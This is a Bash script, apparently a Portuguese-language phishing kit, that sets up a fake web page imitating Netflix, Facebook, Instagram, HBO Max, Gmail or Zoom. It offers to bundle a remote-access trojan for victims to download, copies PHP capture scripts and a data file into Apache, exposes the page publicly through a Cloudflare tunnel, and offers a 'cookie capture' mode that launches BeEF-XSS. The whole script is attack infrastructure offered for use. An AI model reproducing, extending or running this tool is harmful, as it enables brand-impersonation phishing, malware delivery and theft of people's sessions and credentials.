#!/bin/bash

# Cores
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Variáveis
type_models="API/img" # Local das imagens
type_egs="API/models" # Local dos modelos
apache="/var/www/html/page-fake" # Local do apache
c="clear" # Limpar

## Criando pastas
echo "[** criando nova pasta para o modelo **]"
mkdir -p $apache
echo "[** Modelo criado com sucesso **]"

# Função RAT antes de tudo
rat() {
    $c
    read -p "Deseja colocar um rat no link? (caso queira)? [S/N]: " rat
    if [[ "$rat" =~ ^[Ss]$ || -z "$rat" ]]; then  # Aceita "S", "s" ou Enter como "sim"
        read -p "Qual caminho da pasta do rat?: " rat_dir
        if [[ -f "$rat_dir" ]]; then
            mkdir -p "$type_egs/exploits"  # Garante que a pasta exista em API/models
            cp "$rat_dir" "$type_egs/exploits/"
            echo -e "${GREEN}[** RAT adicionado com sucesso à pasta exploits/ em $type_egs **]${NC}"
        else
            echo -e "${RED}[** Erro: Arquivo RAT não encontrado em $rat_dir **]${NC}"
        fi
    elif [[ "$rat" =~ ^[Nn]$ ]]; then  # Rejeita "n" ou "N"
        echo -e "${RED}[** Opção 'n' ou 'N' não permitida, considere como 'não' **]${NC}"
        echo -e "${YELLOW}[** Continuando sem adicionar RAT **]${NC}"
    else  # Qualquer outra coisa é "não"
        echo -e "${YELLOW}[** Continuando sem adicionar RAT **]${NC}"
    fi
}

# Chama a função RAT logo após criar a pasta, antes de limpar a tela
rat

TERMINAL=$(command -v gnome-terminal || command -v xfce4-terminal || command -v x-terminal-emulator || echo "xterm") # Verifica o terminal disponível
$c  # Só limpa a tela depois da pergunta do RAT

# Função para exibir o menu principal
show_model_menu() {
    $c
    echo -e "${GREEN}+______________________________________________________________________+${GREEN}"
    echo -e "${RED}|                                                                      |${RED}"
    echo -e "${YELLOW}|            ${GREEN}[**Escolha qual tipo de EG.S você deseja**]${NC}               ${YELLOW}|${NC}"
    echo -e "${RED}+______________________________________________________________________+${GREEN}"
    echo -e "${RED}|                                                                      |${RED}"     
    echo -e "${YELLOW}|   1 --------------------------------->> ${RED}Standart${NC}                     ${YELLOW}|${NC}"         
    echo -e "${YELLOW}+______________________________________________________________________+${GREEN}"
    echo -e "${RED}|                                                                      ${YELLOW}|${NC}"                     
    echo -e "${YELLOW}|   2 ------------------>> ${YELLOW}Captura de cookies Beta${NC}                     ${GREEN}|${NC}"
    echo -e "${GREEN}+______________________________________________________________________+${GREEN}"
    echo -e "${RED}|                                                                      |${RED}"
    echo -e "${YELLOW}|   0 -------->> ${RED}Sair${NC}                                                  ${YELLOW}|${NC}" 
    echo -e "${RED}+______________________________________________________________________+${GREEN}"
    echo -e " 
    "
}

# Função para exibir o menu de modelos
show_main_menu() {
    $c
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|            ${GREEN}Created by t0xina_Byt3${NC}                                    ${YELLOW}|${NC}"
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|                 ${GREEN}[**Escolha o tipo de modelo**]${NC}                       ${YELLOW}|${NC}"
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"     
    echo -e "${YELLOW}|   1 --------------------------------->> ${GREEN}Netflix${NC}                      ${YELLOW}|${NC}"         
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"                     
    echo -e "${YELLOW}|   2 ------------------>> ${GREEN}Facebook${NC}                                    ${YELLOW}|${NC}"
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   3 ------------------------------->> ${GREEN}Instagram${NC}                      ${YELLOW}|${NC}"
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   4 ---------------------->> ${GREEN}HboMax${NC}                                  ${YELLOW}|${NC}"
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   5 ------------------->> ${GREEN}Gmail${NC}                                      ${YELLOW}|${NC}"
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   6 ------------------->> ${GREEN}Zoom${NC}                                       ${YELLOW}|${NC}"
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e "${YELLOW}|                                                                      |${NC}"
    echo -e "${YELLOW}|   0 -------->> ${RED}Voltar${NC}                                                ${YELLOW}|${NC}" 
    echo -e "${YELLOW}+______________________________________________________________________+${NC}"
    echo -e " 
    "
}

# Função para processar a escolha do modelo
process_main_choice() {
    case $1 in
        1)
            echo -e "${GREEN}${NC}" 
            cp "$type_models/1.jpg" "$apache"  
            ;;
        2)
            echo -e "${GREEN}${NC}"
            cp "$type_models/2.jpg" "$apache" 
            mv "$apache/2.jpg" "$apache/1.jpg"
            ;;
        3)
            echo -e "${GREEN}${NC}"
            cp "$type_models/3.jpg" "$apache" 
            mv "$apache/3.jpg" "$apache/1.jpg"
            ;;
        4)
            echo -e "${GREEN}${NC}"
            cp "$type_models/4.jpg" "$apache" 
            mv "$apache/4.jpg" "$apache/1.jpg"
            ;;
        5)
            echo -e "${GREEN}${NC}"
            cp "$type_models/5.jpg" "$apache" 
            mv "$apache/5.jpg" "$apache/1.jpg"
            ;;
        6)
            echo -e "${GREEN}${NC}"
            cp "$type_models/6.jpg" "$apache" 
            mv "$apache/6.jpg" "$apache/1.jpg"
            ;;
        0)
            echo -e "${RED}Voltando ao menu principal... 
            ${NC}"
            ;;
        *)
            echo -e "${RED}Opção inválida! Tente novamente... 
            ${NC}"
            ;;
    esac
}

# Função para processar a escolha do menu principal
process_model_choice() {
    case $1 in
        1)
            echo -e "${GREEN}Você escolheu: Standart${NC}"
            cp "$type_egs/index.php" "$apache"
            echo "[** Script carregado com sucesso no apache **]"
            cp -r "$type_egs/exploits/" "$apache"
            echo "[** Exploits carregados com sucesso no apache **]"
            cp "$type_egs/dados.txt" "$apache"
            echo "[** Dados carregados com sucesso **]"
            chmod +x "$apache/"* # Nivel de permissão de arquivos
            cd "$apache"
            systemctl start apache2
            systemctl enable apache2.service
            echo "[** Apache carregado com sucesso **]"
            $TERMINAL -e "bash -c 'php -S localhost:8080; exec bash'" &
            $TERMINAL -e "bash -c 'cloudflare tunnel --url localhost:8080; exec bash'" &
            $TERMINAL -- bash -c
            ;;
        2)
            echo -e "${GREEN}Você escolheu: Captura de cookies Beta${NC}"
            cp "$type_egs/2.php" "$apache"
            echo "[** Script carregado com sucesso no apache **]"
            echo "[** Iniciando Beef-xss **]"
            systemctl start beef-xss
            systemctl enable beef-xss.service
            cd "$apache"
            systemctl start apache2
            systemctl enable apache2.service
            echo "[** Apache carregado com sucesso **]"
            ;;
        0) 
            echo -e "${RED}Saindo...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Opção inválida! Tente novamente... ${NC}"
            ;;
    esac
}

while true; do
    show_main_menu  # Exibe o menu principal (Modelos)
    read -p "Escolha uma opção --->>>  " choice

    if [[ $choice -eq 0 ]]; then
        echo -e "${RED}Saindo...${NC}"
        exit 0
    fi
    
    # Processa a escolha no menu principal (Modelos)
    process_main_choice $choice
    
    # Pausa para esperar o próximo input
    read -p "Pressione Enter para continuar..."

    # Exibe o menu de EG.S após a escolha do modelo
    show_model_menu
    read -p "Escolha uma opção de --->>> " egs_choice
    process_model_choice $egs_choice

    # Pausa antes de voltar ao loop
    read -p "Pressione Enter para continuar..."
done
